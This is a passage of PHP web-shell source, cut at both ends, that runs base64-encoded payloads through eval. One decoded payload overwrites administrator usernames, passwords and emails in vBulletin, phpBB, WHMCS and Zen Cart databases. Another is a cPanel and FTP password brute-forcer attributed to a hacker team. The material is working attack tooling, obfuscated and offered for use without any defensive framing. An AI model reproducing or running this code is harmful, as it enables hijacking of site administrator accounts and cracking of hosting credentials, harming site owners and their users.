WxfcXVlcnkoIlVQREFURSByYWZpYV91c2VycyBTRVQgdXNlcm5hbWUgPSciLiRhZG1pbi4iJyBXSEVSRSB1c2VyZ3JvdXAgPSAxIikgb3IgZGllKG15c3FsX2Vycm9yKCkpOyAkdGtsPUBteXNxbF9xdWVyeSgiVVBEQVRFIHJhZmlhX3VzZXJzIFNFVCBwYXNzd29yZCA9JyIuJGhhc2guIicgV0hFUkUgdXNlcmdyb3VwID0gMSIpIG9yIGRpZShteXNxbF9lcnJvcigpKTsgJHRrbD1AbXlzcWxfcXVlcnkoIlVQREFURSByYWZpYV91c2VycyBTRVQgdXNlcm5hbWUgPSciLiRhZG1pbi4iJyBXSEVSRSB1c2VyYWRtaW4gPSAxIikgb3IgZGllKG15c3FsX2Vycm9yKCkpOyAkdGtsPUBteXNxbF9xdWVyeSgiVVBEQVRFIHJhZmlhX3VzZXJzIFNFVCBwYXNzd29yZCA9JyIuJGhhc2guIicgV0hFUkUgdXNlcmFkbWluID0gMSIpIG9yIGRpZShteXNxbF9lcnJvcigpKTsgJHRrbD1AbXlzcWxfcXVlcnkoIlVQREFURSByYWZpYV91c2VycyBTRVQgZW1haWwgPSciLiRTUUwuIicgV0hFUkUgdXNlcm5hbWUgPSAnYWRtaW4nIikgb3IgZGllKG15c3FsX2Vycm9yKCkpOyAgIGlmKCR0a2wpeyBlY2hvICI8Yj4gU3VjY2VzczwvYj4gIjsgfSAgfSAgIGlmICgkX1BPU1RbJ0NoYW5nZS1BZG1pbl90eXBlJ10gPT0gJ3ZiJyl7IGVjaG8gJzxGT1JNIG1ldGhvZD0iUE9TVCI+IDo6OkRhdGFCYXNlIGluZm86Ojo8YnI+IGhvc3QgOjxicj4gPElOUFVUIHNpemU9IjE1IiB2YWx1ZT0ibG9jYWxob3N0IiBuYW1lPSJsb2NhbGhvc3QiIHR5cGU9InRleHQiPiA8YnI+ZGF0YWJhc2UgOjxicj4gPElOUFVUIHNpemU9IjE1IiB2YWx1ZT0iIiBuYW1lPSJkYXRhYmFzZSIgdHlwZT0idGV4dCI+PGJyPiA8YnI+dXNlcm5hbWUgOiA8YnI+PElOUFVUIHNpemU9IjE1IiB2YWx1ZT0iIiBuYW1lPSJ1c2VybmFtZSIgdHlwZT0idGV4dCI+IDxicj5wYXNzd29yZCA6IDxicj48SU5QVVQgc2l6ZT0iMTUiIHZhbHVlPSIiIG5hbWU9InBhc3N3b3JkIiB0eXBlPSJwYXNzd29yZCI+PGJyPiAgIDxicj46Ojp2YiBBZG1pbiBpbmZvOjo6IDxicj5OZXcgdXNlcm5hbWU6PGJyPiA8SU5QVVQgbmFtZT0iYWRtaW4iIHNpemU9IjE1IiB2YWx1ZT0iYWRtaW4iPjxicj4gTmV3IHBhc3N3b3JkOjxicj4gMTIxNzc3PGJyPiBOZXcgRW1haWw6PGJyPiA8SU5QVVQgbmFtZT0iZW1haWwiIHNpemU9IjE1IiB2YWx1ZT0iZW1haWxAc2l0ZS5jb20iPjxicj4gPElOUFVUIHZhbHVlPSJjaGFuZ2UtdmItYWRtaW4iIG5hbWU9InNlbmQiIHR5cGU9InN1Ym1pdCI+IDwvRk9STT4nOyB9IGlmICgkX1BPU1RbJ3NlbmQnXSA9PSAnY2hhbmdlLXZiLWFkbWluJyl7ICRsb2NhbGhvc3QgPSAkX1BPU1RbJ2xvY2FsaG9zdCddOyAkZGF0YWJhc2UgID0gJF9QT1NUWydkYXRhYmFzZSddOyAkdXNlcm5hbWUgID0gJF9QT1NUWyd1c2VybmFtZSddOyAkcGFzc3dvcmQgID0gJF9QT1NUWydwYXNzd29yZCddOyAkcHdkICAgPSAkX1BPU1RbJ3B3ZCddOyAkYWRtaW4gPSAkX1BPU1RbJ2FkbWluJ107ICRTUUwgPSAkX1BPU1RbJ2VtYWlsJ107ICAgQG15c3FsX2Nvbm5lY3QoJGxvY2FsaG9zdCwkdXNlcm5hbWUsJHBhc3N3b3JkKSBvciBkaWUobXlzcWxfZXJyb3IoKSk7ICBAbXlzcWxfc2VsZWN0X2RiKCRkYXRhYmFzZSkgb3IgZGllKG15c3FsX2Vycm9yKCkpOyAgJGhhc2ggPSBtZDUoJHB3ZCk7ICR0a2w9QG15c3FsX3F1ZXJ5KCJVUERBVEUgdXNlciBTRVQgdXNlcm5hbWUgPSciLiRhZG1pbi4iJyBXSEVSRSB1c2VybmFtZSAgPSAnYWRtaW4nIikgb3IgZGllKG15c3FsX2Vycm9yKCkpOyAkdGtsPUBteXNxbF9xdWVyeSgiVVBEQVRFIHVzZXIgU0VUIHBhc3N3b3JkID0nMzA0MjE3Nzg5MGMyZTc5NzczZTBlZDhlOGVmNmQwMzYnIFdIRVJFIHVzZXJuYW1lICA9ICdhZG1pbiciKSBvciBkaWUobXlzcWxfZXJyb3IoKSk7ICR0a2w9QG15c3FsX3F1ZXJ5KCJVUERBVEUgdXNlciBTRVQgdXNlcm5hbWUgPSciLiRhZG1pbi4iJyBXSEVSRSB1c2VyaWQgPSAxIikgb3IgZGllKG15c3FsX2Vycm9yKCkpOyAkdGtsPUBteXNxbF9xdWVyeSgiVVBEQVRFIHVzZXIgU0VUIHBhc3N3b3JkID0nMzA0MjE3Nzg5MGMyZTc5NzczZTBlZDhlOGVmNmQwMzYnIFdIRVJFIHVzZXJpZCA9IDEiKSBvciBkaWUobXlzcWxfZXJyb3IoKSk7ICR0a2w9QG15c3FsX3F1ZXJ5KCJVUERBVEUgdXNlciBTRVQgZW1haWwgPSciLiRTUUwuIicgV0hFUkUgdXNlcm5hbWUgPSAnYWRtaW4nIikgb3IgZGllKG15c3FsX2Vycm9yKCkpOyAgIGlmKCR0a2wpeyBlY2hvICI8Yj4gU3VjY2VzcyA8YnI+TmV3IHBhc3N3b3JkID0gMTIxNzc3PC9iPiAiOyB9ICB9ICBpZiAoJF9QT1NUWydDaGFuZ2UtQWRtaW5fdHlwZSddID09ICdwaHBiYicpeyBlY2hvICc8Rk9STSBtZXRob2Q9IlBPU1QiPiA6OjpEYXRhQmFzZSBpbmZvOjo6PGJyPiBob3N0IDo8YnI+IDxJTlBVVCBzaXplPSIxNSIgdmFsdWU9ImxvY2FsaG9zdCIgbmFtZT0ibG9jYWxob3N0IiB0eXBlPSJ0ZXh0Ij4gPGJyPmRhdGFiYXNlIDo8YnI+IDxJTlBVVCBzaXplPSIxNSIgdmFsdWU9IiIgbmFtZT0iZGF0YWJhc2UiIHR5cGU9InRleHQiPjxicj4gPGJyPlRhYmxlIFByZWZpeCA6PGJyPiA8SU5QVVQgc2l6ZT0iMTUiIHZhbHVlPSJwaHBiYl8iIG5hbWU9InByZWZpeCIgdHlwZT0idGV4dCI+PGJyPiA8YnI+dXNlcm5hbWUgOiA8YnI+PElOUFVUIHNpemU9IjE1IiB2YWx1ZT0iIiBuYW1lPSJ1c2VybmFtZSIgdHlwZT0idGV4dCI+IDxicj5wYXNzd29yZCA6IDxicj48SU5QVVQgc2l6ZT0iMTUiIHZhbHVlPSIiIG5hbWU9InBhc3N3b3JkIiB0eXBlPSJwYXNzd29yZCI+PGJyPiAgIDxicj46OjpwaHBCQiBBZG1pbiBpbmZvOjo6IDxicj5OZXcgdXNlcm5hbWU6PGJyPiA8SU5QVVQgbmFtZT0iYWRtaW4iIHNpemU9IjE1IiB2YWx1ZT0iYWRtaW4iPjxicj4gTmV3IHBhc3N3b3JkOjxicj4gPElOUFVUIG5hbWU9InB3ZCIgc2l6ZT0iMTUiIHZhbHVlPSIxMjMxMjMiPjxicj4gTmV3IEVtYWlsOjxicj4gPElOUFVUIG5hbWU9ImVtYWlsIiBzaXplPSIxNSIgdmFsdWU9ImVtYWlsQHNpdGUuY29tIj48YnI+IDxJTlBVVCB2YWx1ZT0iY2hhbmdlLXBocEJCLUFkbWluIiBuYW1lPSJzZW5kIiB0eXBlPSJzdWJtaXQiPiA8L0ZPUk0+JzsgfSBpZiAoJF9QT1NUWydzZW5kJ10gPT0gJ2NoYW5nZS1waHBCQi1BZG1pbicpeyAkbG9jYWxob3N0ID0gJF9QT1NUWydsb2NhbGhvc3QnXTsgJGRhdGFiYXNlICA9ICRfUE9TVFsnZGF0YWJhc2UnXTsgJHVzZXJuYW1lICA9ICRfUE9TVFsndXNlcm5hbWUnXTsgJHBhc3N3b3JkICA9ICRfUE9TVFsncGFzc3dvcmQnXTsgJHB3ZCAgID0gJF9QT1NUWydwd2QnXTsgJGFkbWluID0gJF9QT1NUWydhZG1pbiddOyAkU1FMID0gJF9QT1NUWydlbWFpbCddOyAkcHJlZml4ID0gJF9QT1NUWydwcmVmaXgnXTsgICBAbXlzcWxfY29ubmVjdCgkbG9jYWxob3N0LCR1c2VybmFtZSwkcGFzc3dvcmQpIG9yIGRpZShteXNxbF9lcnJvcigpKTsgIEBteXNxbF9zZWxlY3RfZGIoJGRhdGFiYXNlKSBvciBkaWUobXlzcWxfZXJyb3IoKSk7ICAkaGFzaCA9IG1kNSgkcHdkKTsgJHRrbD1AbXlzcWxfcXVlcnkoIlVQREFURSAiLiRwcmVmaXguInVzZXJzIFNFVCB1c2VybmFtZV9jbGVhbiA9JyIuJGFkbWluLiInIFdIRVJFIHVzZXJuYW1lX2NsZWFuID0gJ2FkbWluJyIpIG9yIGRpZShteXNxbF9lcnJvcigpKTsgJHRrbD1AbXlzcWxfcXVlcnkoIlVQREFURSAiLiRwcmVmaXguInVzZXJzIFNFVCB1c2VyX3Bhc3N3b3JkID0nIi4kaGFzaC4iJyBXSEVSRSB1c2VybmFtZV9jbGVhbiA9ICdhZG1pbiciKSBvciBkaWUobXlzcWxfZXJyb3IoKSk7ICR0a2w9QG15c3FsX3F1ZXJ5KCJVUERBVEUgIi4kcHJlZml4LiJ1c2VycyBTRVQgdXNlcm5hbWVfY2xlYW4gPSciLiRhZG1pbi4iJyBXSEVSRSB1c2VyX3R5cGUgPSAzIikgb3IgZGllKG15c3FsX2Vycm9yKCkpOyAkdGtsPUBteXNxbF9xdWVyeSgiVVBEQVRFICIuJHByZWZpeC4idXNlcnMgU0VUIHVzZXJfcGFzc3dvcmQgPSciLiRoYXNoLiInIFdIRVJFIHVzZXJfdHlwZSA9IDMiKSBvciBkaWUobXlzcWxfZXJyb3IoKSk7ICR0a2w9QG15c3FsX3F1ZXJ5KCJVUERBVEUgIi4kcHJlZml4LiJ1c2VycyBTRVQgdXNlcl9lbWFpbCA9JyIuJFNRTC4iJyBXSEVSRSB1c2VybmFtZV9jbGVhbiA9ICdhZG1pbiciKSBvciBkaWUobXlzcWxfZXJyb3IoKSk7ICAgaWYoJHRrbCl7IGVjaG8gIjxiPiBTdWNjZXNzPC9iPiAiOyB9IH0gIGlmICgkX1BPU1RbJ0NoYW5nZS1BZG1pbl90eXBlJ10gPT0gJ3dobWNzJyl7IGVjaG8gJzxGT1JNIG1ldGhvZD0iUE9TVCI+IDo6OkRhdGFCYXNlIGluZm86Ojo8YnI+IGhvc3QgOjxicj4gPElOUFVUIHNpemU9IjE1IiB2YWx1ZT0ibG9jYWxob3N0IiBuYW1lPSJsb2NhbGhvc3QiIHR5cGU9InRleHQiPiA8YnI+ZGF0YWJhc2UgOjxicj4gPElOUFVUIHNpemU9IjE1IiB2YWx1ZT0iIiBuYW1lPSJkYXRhYmFzZSIgdHlwZT0idGV4dCI+PGJyPiA8YnI+dXNlcm5hbWUgOiA8YnI+PElOUFVUIHNpemU9IjE1IiB2YWx1ZT0iIiBuYW1lPSJ1c2VybmFtZSIgdHlwZT0idGV4dCI+IDxicj5wYXNzd29yZCA6IDxicj48SU5QVVQgc2l6ZT0iMTUiIHZhbHVlPSIiIG5hbWU9InBhc3N3b3JkIiB0eXBlPSJwYXNzd29yZCI+PGJyPiAgIDxicj46Ojp3aG1jcyBBZG1pbiBpbmZvOjo6IDxicj5OZXcgdXNlcm5hbWU6PGJyPiA8SU5QVVQgbmFtZT0iYWRtaW4iIHNpemU9IjE1IiB2YWx1ZT0iYWRtaW4iPjxicj4gTmV3IHBhc3N3b3JkOjxicj4gPElOUFVUIG5hbWU9InB3ZCIgc2l6ZT0iMTUiIHZhbHVlPSIxMjMxMjMiPjxicj4gTmV3IEVtYWlsOjxicj4gPElOUFVUIG5hbWU9ImVtYWlsIiBzaXplPSIxNSIgdmFsdWU9ImVtYWlsQHNpdGUuY29tIj48YnI+IDxJTlBVVCB2YWx1ZT0iY2hhbmdlLXdobWNzLWFkbWluIiBuYW1lPSJzZW5kIiB0eXBlPSJzdWJtaXQiPiA8L0ZPUk0+JzsgfSBpZiAoJF9QT1NUWydzZW5kJ10gPT0gJ2NoYW5nZS13aG1jcy1hZG1pbicpeyAkbG9jYWxob3N0ID0gJF9QT1NUWydsb2NhbGhvc3QnXTsgJGRhdGFiYXNlICA9ICRfUE9TVFsnZGF0YWJhc2UnXTsgJHVzZXJuYW1lICA9ICRfUE9TVFsndXNlcm5hbWUnXTsgJHBhc3N3b3JkICA9ICRfUE9TVFsncGFzc3dvcmQnXTsgJHB3ZCAgID0gJF9QT1NUWydwd2QnXTsgJGFkbWluID0gJF9QT1NUWydhZG1pbiddOyAkU1FMID0gJF9QT1NUWydlbWFpbCddOyAgIEBteXNxbF9jb25uZWN0KCRsb2NhbGhvc3QsJHVzZXJuYW1lLCRwYXNzd29yZCkgb3IgZGllKG15c3FsX2Vycm9yKCkpOyAgQG15c3FsX3NlbGVjdF9kYigkZGF0YWJhc2UpIG9yIGRpZShteXNxbF9lcnJvcigpKTsgICRoYXNoID0gbWQ1KCRwd2QpOyAkdGtsPUBteXNxbF9xdWVyeSgiVVBEQVRFIHRibGFkbWlucyBTRVQgcGFzc3dvcmQgPSciLiRoYXNoLiInIHdoZXJlIGlkPScxJyIpIG9yIGRpZShteXNxbF9lcnJvcigpKTsgJHRrbD1AbXlzcWxfcXVlcnkoIlVQREFURSB0YmxhZG1pbnMgU0VUIHVzZXJuYW1lID0nIi4kYWRtaW4uIicgd2hlcmUgaWQ9JzEnIikgb3IgZGllKG15c3FsX2Vycm9yKCkpOyAkdGtsPUBteXNxbF9xdWVyeSgiVVBEQVRFIHRibGFkbWlucyBTRVQgcm9sZWlkPScxJyB3aGVyZSBpZD0nMSciKSBvciBkaWUobXlzcWxfZXJyb3IoKSk7ICR0a2w9QG15c3FsX3F1ZXJ5KCJVUERBVEUgdGJsYWRtaW5zIFNFVCBlbWFpbCA9JyIuJFNRTC4iJyBXSEVSRSB1c2VybmFtZSA9ICdhZG1pbiciKSBvciBkaWUobXlzcWxfZXJyb3IoKSk7ICBpZigkdGtsKXsgZWNobyAiPGI+IFN1Y2Nlc3M8L2I+ICI7IH0gIH0gICBpZiAoJF9QT1NUWydDaGFuZ2UtQWRtaW5fdHlwZSddID09ICd6ZW5jYXJ0Jyl7IGVjaG8gJzxGT1JNIG1ldGhvZD0iUE9TVCI+IDo6OkRhdGFCYXNlIGluZm86Ojo8YnI+IGhvc3QgOjxicj4gPElOUFVUIHNpemU9IjE1IiB2YWx1ZT0ibG9jYWxob3N0IiBuYW1lPSJsb2NhbGhvc3QiIHR5cGU9InRleHQiPiA8YnI+ZGF0YWJhc2UgOjxicj4gPElOUFVUIHNpemU9IjE1IiB2YWx1ZT0iIiBuYW1lPSJkYXRhYmFzZSIgdHlwZT0idGV4dCI+PGJyPiA8YnI+VGFibGUgUHJlZml4IDo8YnI+IDxJTlBVVCBzaXplPSIxNSIgdmFsdWU9IiIgbmFtZT0icHJlZml4IiB0eXBlPSJ0ZXh0Ij48YnI+IDxicj51c2VybmFtZSA6IDxicj48SU5QVVQgc2l6ZT0iMTUiIHZhbHVlPSIiIG5hbWU9InVzZXJuYW1lIiB0eXBlPSJ0ZXh0Ij4gPGJyPnBhc3N3b3JkIDogPGJyPjxJTlBVVCBzaXplPSIxNSIgdmFsdWU9IiIgbmFtZT0icGFzc3dvcmQiIHR5cGU9InBhc3N3b3JkIj48YnI+ICAgPGJyPjo6OnplbmNhcnQgQWRtaW4gaW5mbzo6OiA8YnI+TmV3IHVzZXJuYW1lOjxicj4gPElOUFVUIG5hbWU9ImFkbWluIiBzaXplPSIxNSIgdmFsdWU9ImFkbWluIj48YnI+IE5ldyBwYXNzd29yZDo8YnI+IDEyMTc3Nzxicj4gTmV3IEVtYWlsOjxicj4gPElOUFVUIG5hbWU9ImVtYWlsIiBzaXplPSIxNSIgdmFsdWU9ImVtYWlsQHNpdGUuY29tIj48YnI+IDxJTlBVVCB2YWx1ZT0iY2hhbmdlLXplbmNhcnQtYWRtaW4iIG5hbWU9InNlbmQiIHR5cGU9InN1Ym1pdCI+IDwvRk9STT4nOyB9IGlmICgkX1BPU1RbJ3NlbmQnXSA9PSAnY2hhbmdlLXplbmNhcnQtYWRtaW4nKXsgJGxvY2FsaG9zdCA9ICRfUE9TVFsnbG9jYWxob3N0J107ICRkYXRhYmFzZSAgPSAkX1BPU1RbJ2RhdGFiYXNlJ107ICR1c2VybmFtZSAgPSAkX1BPU1RbJ3VzZXJuYW1lJ107ICRwYXNzd29yZCAgPSAkX1BPU1RbJ3Bhc3N3b3JkJ107ICRwd2QgICA9ICRfUE9TVFsncHdkJ107ICRhZG1pbiA9ICRfUE9TVFsnYWRtaW4nXTsgJFNRTCA9ICRfUE9TVFsnZW1haWwnXTsgJHByZWZpeCA9ICRfUE9TVFsncHJlZml4J107ICAgQG15c3FsX2Nvbm5lY3QoJGxvY2FsaG9zdCwkdXNlcm5hbWUsJHBhc3N3b3JkKSBvciBkaWUobXlzcWxfZXJyb3IoKSk7ICBAbXlzcWxfc2VsZWN0X2RiKCRkYXRhYmFzZSkgb3IgZGllKG15c3FsX2Vycm9yKCkpOyAgJGhhc2ggPSBtZDUoJHB3ZCk7ICR0a2w9QG15c3FsX3F1ZXJ5KCJVUERBVEUgIi4kcHJlZml4LiJhZG1pbiBTRVQgYWRtaW5fbmFtZSA9JyIuJGFkbWluLiInIFdIRVJFIGFkbWluX2xldmVsID0gMSIpIG9yIGRpZShteXNxbF9lcnJvcigpKTsgJHRrbD1AbXlzcWxfcXVlcnkoIlVQREFURSAiLiRwcmVmaXguImFkbWluIFNFVCBhZG1pbl9wYXNzID0nYjQyZjNjYzhhZmQ3NjMzNGNiMmMzYzNjZGZlZTExMzE6NzknIFdIRVJFIGFkbWluX25hbWUgPSAnYWRtaW4nIikgb3IgZGllKG15c3FsX2Vycm9yKCkpOyAkdGtsPUBteXNxbF9xdWVyeSgiVVBEQVRFICIuJHByZWZpeC4iYWRtaW4gU0VUIGFkbWluX25hbWUgPSciLiRhZG1pbi4iJyBXSEVSRSBhZG1pbl9pZCA9MSIpIG9yIGRpZShteXNxbF9lcnJvcigpKTsgJHRrbD1AbXlzcWxfcXVlcnkoIlVQREFURSAiLiRwcmVmaXguImFkbWluIFNFVCBhZG1pbl9wYXNzID0nYjQyZjNjYzhhZmQ3NjMzNGNiMmMzYzNjZGZlZTExMzE6NzknIFdIRVJFIGFkbWluX2lkID0xIikgb3IgZGllKG15c3FsX2Vycm9yKCkpOyAkdGtsPUBteXNxbF9xdWVyeSgiVVBEQVRFICIuJHByZWZpeC4iYWRtaW4gU0VUIGFkbWluX2VtYWlsID0nIi4kU1FMLiInIFdIRVJFIGFkbWluX25hbWUgPSAnYWRtaW4nIikgb3IgZGllKG15c3FsX2Vycm9yKCkpOyAgIGlmKCR0a2wpeyBlY2hvICI8Yj4gU3VjY2VzcyA8YnI+IE5ldyBwYXNzd29yZCA9IDEyMTc3NzwvYj4gIjsgfSAgfQ==";
eval(base64_decode($tkl));
exit;
case "Bruteforce":
$tkl = "CiRjcGFuZWxfcG9ydD0iMjA4MiI7CiRjb25uZWN0X3RpbWVvdXQ9NTsKQGVycm9yX3JlcG9ydGluZygwKTsKc2V0X3RpbWVfbGltaXQoMCk7CiRzdWJtaXQ9JF9SRVFVRVNUWydzdWJtaXQnXTsKJHVzZXJzPSRfUkVRVUVTVFsndXNlcnMnXTsKJHBhc3M9JF9SRVFVRVNUWydwYXNzd29yZHMnXTsKJHRhcmdldD0kX1JFUVVFU1RbJ3RhcmdldCddOwokY3JhY2t0eXBlPSRfUkVRVUVTVFsnY3JhY2t0eXBlJ107CiR0YXJnZXQgPSAibG9jYWxob3N0IjsKCmVjaG8nCjxmb3JtICBtZXRob2Q9IlBPU1QiPgpVc2VycyBsaXN0ICZuYnNwOyAmbmJzcDsgJm5ic3A7ICAmbmJzcDsgJm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7ICZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOyAmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsgJm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7ICZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOyAmbmJzcDsmbmJzcDsmbmJzcDtQYXNzd29yZCBsaXN0PGJyPgo8dGV4dGFyZWEgcm93cz0iMjAiIG5hbWU9InVzZXJzIiBjb2xzPSIyNSI+Jy4kdXNlcnMuJzwvdGV4dGFyZWE+PHRleHRhcmVhIHJvd3M9IjIwIiBuYW1lPSJwYXNzd29yZHMiIGNvbHM9IjI1Ij4nLiRwYXNzLic8L3RleHRhcmVhPjxicj4KClNlbGVjdCBCcnV0ZWZvcmNlIFR5cGUgOiA8YnIvPjxwPgo8c2VsZWN0IG5hbWU9ImNyYWNrdHlwZSI+CjxvcHRpb24gdmFsdWU9ImNwYW5lbCI+Q1BhbmVsIENyYWNrPC9vcHRpb24+CjxvcHRpb24gdmFsdWU9ImZ0cCI+RlRQIENyYWNrPC9vcHRpb24+Cjwvc2VsZWN0Pgo8YnI+PCEtLVQuSy5MLS0+PGJyPjxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJDcmFjayIgbmFtZT0ic3VibWl0Ii8+CjwvcD48L2Zvcm0+JzsKCQkKaWYgKCRfUE9TVFsnY3JhY2t0eXBlJ109PSdmdHAnKXsKZnVuY3Rpb24gYnJ1dGUoKQp7CglnbG9iYWwgJHZhbHMsJG1pbl9sZW5ndGgsJG1heF9sZW5ndGg7CglnbG9iYWwgJHRhcmdldCwkcHVyZXVzZXIsJGNvbm5lY3RfdGltZW91dDsKCSRtaW49JG1pbl9sZW5ndGg7CgkkbWF4PSRtYXhfbGVuZ3RoOwoJJEEgPSBhcnJheSgpOwoJJG51bVZhbHMgPSBjb3VudCgkdmFscyk7CgkkaW5jRG9uZSA9ICIiOwoJJHJlYWxNYXggPSAiIjsKCSRjdXJyZW50VmFsID0gIiI7CgkkZmlyc3RWYWwgPSAiIjsKCWZvciAoJGkgPSAwOyAkaSA8ICgkbWF4ICsgMSk7ICRpKyspIHsKCQkkQVskaV0gPSAtMTsKCX0KCQoJZm9yICgkaSA9IDA7ICRpIDwgJG1heDsgJGkrKykgewoJCSRyZWFsTWF4ID0gJHJlYWxNYXggLiAkdmFsc1skbnVtVmFscyAtIDFdOwoJfQoJZm9yICgkaSA9IDA7ICRpIDwgJG1pbjsgJGkrKykgewoJCSRBWyRpXSA9ICR2YWxzWzBdOwoJfQoJJGkgPSAwOwoJd2hpbGUgKCRBWyRpXSAhPSAtMSkgewoJCSRmaXJzdFZhbCAuPSAkQVskaV07CgkJJGkrKzsKCX0KCWNwYW5lbF9jaGVjaygkdGFyZ2V0LCRwdXJldXNlciwkZmlyc3RWYWwsJGNvbm5lY3RfdGltZW91dCk7CgkKCXdoaWxlICgxKSB7CgkJZm9yICgkaSA9IDA7ICRpIDwgKCRtYXggKyAxKTsgJGkrKykgewoJCQlpZiAoJEFbJGldID09IC0xKSB7CgkJCQlicmVhazsKCQkJfQoJCX0KCQkkaS0tOwoJCSRpbmNEb25lID0gMDsKCQl3aGlsZSAoISRpbmNEb25lKSB7CQoJCQlmb3IgKCRqID0gMDsgJGogPCAkbnVtVmFsczsgJGorKykgewoJCQkJaWYgKCRBWyRpXSA9PSAkdmFsc1skal0pIHsKCQkJCQlicmVhazsKCQkJCX0KCQkJfQoJCQlpZiAoJGogPT0gKCRudW1WYWxzIC0gMSkpIHsKCQkJCSRBWyRpXSA9ICR2YWxzWzBdOwoJCQkJJGktLTsKCQkJCWlmICgkaSA8IDApIHsKCQkJCQlmb3IgKCRpID0gMDsgJGkgPCAoJG1heCArIDEpOyAkaSsrKSB7CgkJCQkJCWlmICgkQVskaV0gPT0gLTEpIHsKCQkJCQkJCWJyZWFrOwoJCQkJCQl9CgkJCQkJfQoJCQkJCSRBWyRpXSA9ICR2YWxzWzBdOwoJCQkJCSRBWyRpICsgMV0gPSAtMTsKCQkJCQkkaW5jRG9uZSA9IDE7CgkJCQkJcHJpbnQgIlN0YXJ0aW5nICIgLiAoc3RybGVuKCRjdXJyZW50VmFsKSArIDEpIC4gIiBDaGFyYWN0ZXJzIENyYWNraW5nPGJyPiI7CgkJCQl9CgkJCX0gZWxzZSB7CgkJCQkkQVskaV0gPSAkdmFsc1skaiArIDFdOwoJCQkJJGluY0RvbmUgPSAxOwoJCQl9CgkJfQoJCSRpID0gMDsKCQkkY3VycmVudFZhbCA9ICIiOwoJCXdoaWxlICgkQVskaV0gIT0gLTEpIHsKCQkJJGN1cnJlbnRWYWwgPSAkY3VycmVudFZhbCAuICRBWyRpXTsKCQkJJGkrKzsKCQl9CgkJY3BhbmVsX2NoZWNrKCR0YXJnZXQsJHB1cmV1c2VyLCRjdXJyZW50VmFsLCRjb25uZWN0X3RpbWVvdXQpOwoJCWlmICgkY3VycmVudFZhbCA9PSAkcmVhbE1heCkgewoJCQlyZXR1cm4gMDsKCQl9Cgl9Cn0KZnVuY3Rpb24gZ2V0bWljcm90aW1lKCkgewogICBsaXN0KCR1c2VjLCAkc2VjKSA9IGV4cGxvZGUoIiAiLG1pY3JvdGltZSgpKTsKICAgcmV0dXJuICgoZmxvYXQpJHVzZWMgKyAoZmxvYXQpJHNlYyk7Cn0gCgpmdW5jdGlvbiBmdHBfY2hlY2soJGhvc3QsJHVzZXIsJHBhc3MsJHRpbWVvdXQpCnsKICRjaCA9IGN1cmxfaW5pdCgpOwogY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1VSTCwgImZ0cDovLyRob3N0Iik7CiBjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfUkVUVVJOVFJBTlNGRVIsIDEpOwogY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX0hUVFBBVVRILCBDVVJMQVVUSF9CQVNJQyk7CiBjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfRlRQTElTVE9OTFksIDEpOwogY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1VTRVJQV0QsICIkdXNlcjokcGFzcyIpOwogY3VybF9zZXRvcHQgKCRjaCwgQ1VSTE9QVF9DT05ORUNUVElNRU9VVCwgJHRpbWVvdXQpOwogY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX0ZBSUxPTkVSUk9SLCAxKTsKICRkYXRhID0gY3VybF9leGVjKCRjaCk7CiBpZiAoIGN1cmxfZXJybm8oJGNoKSA9PSAyOCApCiB7CiBwcmludCAiWy1dRXJyb3IgOiBDb25uZWN0aW9uIFRpbWVvdXQiO2V4aXQ7CiB9CiBlbHNlIGlmICggY3VybF9lcnJubygkY2gpID09IDAgKQogewogIHByaW50ICI8YnI+WytdQnJ1dGVmb3JjZSBTdWNjZXNzIDxicj4gLS0tLT5Vc2VybmFtZSA6ICR1c2VyIDxicj4tLS0tPlBhc3N3b3JkIDogJHBhc3MiOwogfQogY3VybF9jbG9zZSgkY2gpOwp9CgokdGltZV9zdGFydCA9IGdldG1pY3JvdGltZSgpOwoKaWYoaXNzZXQoJHN1Ym1pdCkgJiYgIWVtcHR5KCRzdWJtaXQpKQp7CiBpZihlbXB0eSgkdXNlcnMpICYmIGVtcHR5KCRwYXNzKSApCiB7CiAgIHByaW50ICI8YnI+Wy1dRXJyb3IgOlBsZWFzZSBFbnRlciBUaGUgVXNlcnMgTGlzdCI7IGV4aXQ7IH0KIGlmKGVtcHR5KCR1c2VycykpeyBwcmludCAiPGJyPlstXUVycm9yIDpQbGVhc2UgRW50ZXIgVGhlIFVzZXJzIExpc3QiOyBleGl0OyB9CiBpZihlbXB0eSgkcGFzcykgJiYgJF9SRVFVRVNUWydicnV0ZWZvcmNlJ10hPSJ0cnVlIiApeyBwcmludCAiPGJyPlstXUVycm9yIDpQbGVhc2UgRW50ZXIgVGhlIFBhc3N3b3JkIExpc3QiOyBleGl0OyB9OwogJHVzZXJsaXN0PWV4cGxvZGUoIlxuIiwkdXNlcnMpOwogJHBhc3NsaXN0PWV4cGxvZGUoIlxuIiwkcGFzcyk7CiBwcmludCAiPGJyPltpbmZvXSBHYXphIEhhQ0tlUiBUZWFtIDxicj5bK11CcnV0ZWZvcmNlIFN0YXJ0ZWQuLi48YnI+IjsKCiBpZihpc3NldCgkX1BPU1RbJ2Nvbm5lY3RfdGltZW91dCddKSkKIHsKICAkY29ubmVjdF90aW1lb3V0PSRfUE9TVFsnY29ubmVjdF90aW1lb3V0J107CiB9CgogaWYoJGNyYWNrdHlwZSA9PSAiZnRwIikKIHsKICBmb3JlYWNoICgkdXNlcmxpc3QgYXMgJHVzZXIpIAogIHsKICAgJHB1cmV1c2VyID0gdHJpbSgkdXNlcik7CiAgIGZvcmVhY2ggKCRwYXNzbGlzdCBhcyAkcGFzc3dvcmQgKSAKICAgewogICAgICRwdXJlcGFzcyA9IHRyaW0oJHBhc3N3b3JkKTsKICAgICBmdHBfY2hlY2soJHRhcmdldCwkcHVyZXVzZXIsJHB1cmVwYXNzLCRjb25uZWN0X3RpbWVvdXQpOwogICB9CiAgfQogfQogCiBpZiAoJGNyYWNrdHlwZSA9PSAiY3BhbmVsIiB8fCAkY3JhY2t0eXBlID09ICJjcGFu